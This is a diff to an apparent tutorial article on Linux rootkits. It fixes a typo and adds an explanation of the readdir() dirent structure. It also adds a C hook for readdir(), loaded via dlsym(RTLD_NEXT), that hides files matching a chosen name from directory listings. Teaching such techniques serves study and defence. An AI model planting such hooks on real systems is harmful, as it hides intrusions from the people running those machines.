@@ -425,7 +425,7 @@ getdents64(3, /* 0 entries */, 32768)   = 0
 close(3)  
 ```
 
-We see that `getdents()` getting the directory entries for the `3` file descripter and brings back `34` entries with a size of `1064`. So we have to figure out how `readdir()` works. 
+We see that `getdents()` getting the directory entries for the `3` file descriptor and brings back `34` entries with a size of `1064`. So we have to figure out how `readdir()` works. 
 
 The [manpage](http://man7.org/linux/man-pages/man3/readdir.3.html) defines the function: `struct dirent *readdir(DIR *dirp);`. 
 
@@ -439,6 +439,23 @@ struct dirent {
                                               by all filesystem types */
                char           d_name[256]; /* Null-terminated filename */
            }
+```
+
+The only member that is mandatory in the structure is the `d_name` which is the null-terminated filename of the entry. That seems pretty easy actually. We can actually key in on this fact, that `d_name` is mandatory, and compare its value for entries to a string, such as `rootkit.txt` and somehow manipulate the function to skip our entries. Let's actually do that! Here is our hook for `readdir()`:
+```c
+struct dirent *(*old_readdir)(DIR *dir);
+struct dirent *readdir(DIR *dirp)
+{
+    old_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *dir;
+
+    while (dir = old_readdir(dirp))
+    {
+        if(strstr(dir->d_name,FILENAME) == 0) break;
+    }
+    return dir;
+}
 ```
 
 
